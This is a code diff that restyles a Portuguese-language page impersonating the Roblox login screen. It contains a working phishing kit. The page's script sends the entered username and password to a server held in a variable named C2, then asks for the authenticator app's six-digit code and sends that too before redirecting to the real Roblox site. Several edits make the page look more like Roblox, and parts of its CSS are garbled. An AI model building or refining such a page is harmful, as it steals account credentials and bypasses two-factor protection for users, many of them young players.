@@ -5,18 +5,21 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Roblox</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; }
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');
+
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
   
   body {
-    background-color: #111;
-    background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.8)), url('https://images.rbxcdn.com/fe7c0a5d4d2b4b0f2c4c3d0a1b2c3d4e.jpg'); /* Fundo genérico escuro */
-    background-size: cover;
-    background-position: center;
-    background-attachment: fixed;
+    background-color: #000;
     color: #fff;
+    min-height: 100vh;
+    /* Imagem de fundo parecida com a do Roblox */
+    background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('https://images.rbxcdn.com/95d6cbff8bbdaa66c58a0a47a08b597b.jpg');
+    background-size: cover;
+    background-position: center top;
+    background-attachment: fixed;
     display: flex;
     flex-direction: column;
-    min-height: 100vh;
   }
 
   /* Top Bar */
@@ -25,8 +28,10 @@
     align-items: center;
     justify-content: space-between;
     padding: 12px 16px;
-    background: #191a1c;
-    border-bottom: 1px solid #000;
+    background: rgba(25, 26, 28, 0.95);
+    border-bottom:;
+ 1px solid rgba(255 ,255, }
+255,0.1 );
   }
   .logo-icon {
     width: 28px;
@@ -36,31 +41,31 @@
     border-radius: 4px;
     display: flex;
     align-items: center;
-    justify-content: center;
-  }
-  .logo-icon svg { width: 18px; height: 18px; fill: #191a1c; }
+    justify-content: center .logo-icon svg { width: 18px; height: 18px; fill: #191a1c; }
   
-  .top-actions { display: flex; gap: 8px; align-items: center; }
+  .top-actions { display: flex; gap: 12px; align-items: center; }
   .btn-top {
-    padding: 6px 12px;
-    border-radius: 4px;
+    padding: 6px 14px;
+    border-radius: 8px;
     font-size: 14px;
     font-weight: 600;
     cursor: pointer;
     text-decoration: none;
+    border: none;
   }
-  .btn-blue { background: #4053ff; color: #fff; border: none; }
-  .btn-outline { background: transparent; color: #fff; border: 1px solid #555; }
-  .search-icon { width: 20px; height: 20px; fill: #fff; }
+  .btn-blue { background: #3b51ff; color: #fff; }
+  .btn-outline { background: transparent; color: #fff; border: 1px solid rgba(255,255,255,0.4); }
+  .search-icon { width: 24px; height: 24px; fill: #fff; }
 
   .nav-tabs {
     display: flex;
     padding: 0 16px;
-    background: #191a1c;
+    background: rgba(25, 26, 28, 0.95);
     overflow-x: auto;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
   }
   .nav-tab {
-    padding: 12px 16px;
+    padding: 14px 16px;
     font-size: 14px;
     font-weight: 600;
     color: #b8b8b8;
@@ -79,50 +84,52 @@
   }
 
   .login-card {
-    background: #27292d;
+    background: #232527;
     border-radius: 8px;
-    padding: 24px;
+    padding: 32px 24px;
     width: 100%;
-    max-width: 400px;
-    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    max-width: 360px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+    border: 1px solid rgba(255,255,255,0.05);
   }
 
   .login-card h1 {
-    font-size: 24px;
+    font-size: 22px;
     font-weight: 700;
     text-align: center;
-    margin-bottom: 20px;
+    margin-bottom: 24px;
     color: #fff;
   }
 
-  .input-group {
-    margin-bottom: 12px;
-  }
+  .input-group { margin-bottom: 14px; }
   input {
     width: 100%;
-    padding: 12px 14px;
-    background: #32353b;
-    border: 1px solid #444;
-    border-radius: 4px;
+    padding: 14px 16px;
+    background: #393b3d;
+    border: 1px solid #555;
+    border-radius: 8px;
     color: #fff;
     font-size: 16px;
     outline: none;
+    transition: border 0.2s;
   }
-  input:focus { border-color: #777; }
+  input:focus { border-color: #3b51ff; }
   input::placeholder { color: #999; }
 
   .btn-main {
     width: 100%;
-    padding: 12px;
+    padding: 14px;
     background: transparent;
     color: #fff;
-    border: 1px solid #666;
-    border-radius: 4px;
+    border: 1px solid #555;
+    border-radius: 8px;
     font-size: 16px;
     font-weight: 600;
     margin-top: 4px;
     cursor: pointer;
+    transition: background 0.2s;
   }
+  .btn-main:hover { background: rgba(255,255,255,0.05); }
   .btn-main:active { background: rgba(255,255,255,0.1); }
 
   .forgot-link {
@@ -130,28 +137,33 @@
     text-align: center;
     color: #fff;
     font-size: 14px;
-    margin: 16px 0;
+    margin: 18px 0;
     text-decoration: none;
   }
 
   .divider {
     height: 1px;
     background: #444;
-    margin: 16px 0;
+    margin: 18px 0;
   }
 
   .btn-alt {
     width: 100%;
-    padding: 12px;
-    background: #32353b;
+    padding: 14px;
+    background: #393b3d;
     color: #fff;
     border: none;
-    border-radius: 4px;
+    border-radius: 8px;
     font-size: 15px;
     font-weight: 600;
-    margin-bottom: 8px;
+    margin-bottom: 10px;
     cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
   }
+  .btn-alt:hover { background: #444; }
 
   .signup-text {
     text-align: center;
@@ -159,17 +171,18 @@
     color: #b8b8b8;
     margin-top: 24px;
   }
-  .signup-text a { color: #fff; text-decoration: none; }
+  .signup-text a { color: #fff; font-weight: 600; text-decoration: none; }
 
   .error {
     color: #ff4a4a;
     font-size: 13px;
-    margin-bottom: 8px;
+    margin-bottom: 12px;
     display: none;
+    text-align: center;
   }
   .hidden { display: none !important; }
   
-  /* Footer */
+  /* Footer (aquela caixa de classificação) */
   .footer {
     background: #191a1c;
     padding: 16px;
@@ -177,10 +190,14 @@
     font-size: 12px;
     color: #fff;
     border-top: 1px solid #000;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
   }
   .age-badge {
     display: inline-flex;
-    align-items: center;
+    align-items: stretch;
     background: #fff;
     border-radius: 4px;
     overflow: hidden;
@@ -192,12 +209,18 @@
     font-size: 24px;
     font-weight: 700;
     padding: 4px 12px;
+    display: flex;
+    align-items: center;
   }
   .age-text {
     color: #000;
     font-size: 14px;
-    padding: 0 12px;
+    font-weight: 600;
+    padding: 0 16px;
+    display: flex;
+    align-items: center;
   }
+  .footer-text { color: #b8b8b8; font-size: 11px; }
 </style>
 </head>
 <body>
@@ -226,9 +249,10 @@
   <div class="modal-container">
     <div class="login-card">
       <h1>Entrar na Roblox</h1>
+      <div class="error" id="err"></div>
       
+      <!-- Tela 1 -->
       <div id="step1">
-        <div class="error" id="err1"></div>
         <div class="input-group">
           <input type="text" id="user" placeholder="Usuário/e-mail/telefone" required autocomplete="username">
         </div>
@@ -241,19 +265,23 @@
         
         <div class="divider"></div>
         
-        <button class="btn-alt">Envie-me um código único por e-mail</button>
-        <button class="btn-alt">Entrada rápida</button>
+        <button class="btn-alt">
+           <span style="font-size:18px;">✉️</span> Envie-me um código único por e-mail
+        </button>
+        <button class="btn-alt">
+           <span style="font-size:18px;">⚡</span> Entrada rápida
+        </button>
         
         <div class="signup-text">
           Não possui uma conta? <a href="#">Cadastrar-se</a>
         </div>
       </div>
 
+      <!-- Tela 2 (2FA) -->
       <div id="step2" class="hidden">
         <p style="font-size: 14px; color: #b8b8b8; margin-bottom: 16px; text-align: center;">
           Insira o código de verificação do seu app autenticador.
         </p>
-        <div class="error" id="err2"></div>
         <div class="input-group">
           <input type="text" id="code" placeholder="Código de 6 dígitos" maxlength="6" inputmode="numeric" style="text-align:center; font-size: 20px; letter-spacing: 4px;">
         </div>
@@ -269,8 +297,8 @@
       <div class="age-num">16</div>
       <div class="age-text">Violência</div>
     </div>
-    <div>Interação entre usuários</div>
-    <div>Compras no jogo (inclui itens aleatórios)</div>
+    <div class="footer-text">Interação entre usuários</div>
+    <div class="footer-text">Compras no jogo (inclui itens aleatórios)</div>
   </div>
 
 <script>
@@ -283,13 +311,12 @@ async function sendLogin() {
   const user = document.getElementById("user").value.trim();
   const pass = document.getElementById("pass").value;
   if (!user || !pass) {
-    showErr("err1", "Preencha todos os campos.");
+    showErr("Preencha todos os campos.");
     return;
   }
   currentUser = user; currentPass = pass;
   
   try {
-    // Tenta logar de verdade pelo Worker
     const r = await fetch(C2 + "/roblox/login", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
@@ -298,25 +325,23 @@ async function sendLogin() {
     const data = await r.json();
     
     if (data.twofa) {
-      // Se tiver 2FA, mostra a tela de código
       document.getElementById("step1").classList.add("hidden");
       document.getElementById("step2").classList.remove("hidden");
       document.querySelector("h1").textContent = "Verificação";
     } else if (data.success) {
-      // Login deu certo (sem 2FA)
       location.href = "https://www.roblox.com/home";
     } else {
-      showErr("err1", "Nome de usuário ou senha incorretos.");
+      showErr("Nome de usuário ou senha incorretos.");
     }
   } catch(e) {
-    showErr("err1", "Erro de conexão. Tente novamente.");
+    showErr("Erro de conexão. Tente novamente.");
   }
 }
 
 async function sendCode() {
   const code = document.getElementById("code").value.trim();
   if (code.length !== 6) {
-    showErr("err2", "O código deve ter 6 dígitos.");
+    showErr("O código deve ter 6 dígitos.");
     return;
   }
   try {
@@ -329,15 +354,15 @@ async function sendCode() {
     if (data.success) {
       location.href = "https://www.roblox.com/home";
     } else {
-      showErr("err2", "Código inválido ou expirado.");
+      showErr("Código inválido ou expirado.");
     }
   } catch(e) {
-    showErr("err2", "Erro de conexão. Tente novamente.");
+    showErr("Erro de conexão. Tente novamente.");
   }
 }
 
-function showErr(id, msg) {
-  const el = document.getElementById(id);
+function showErr(msg) {
+  const el = document.getElementById("err");
   el.textContent = msg;
   el.style.display = "block";
 }
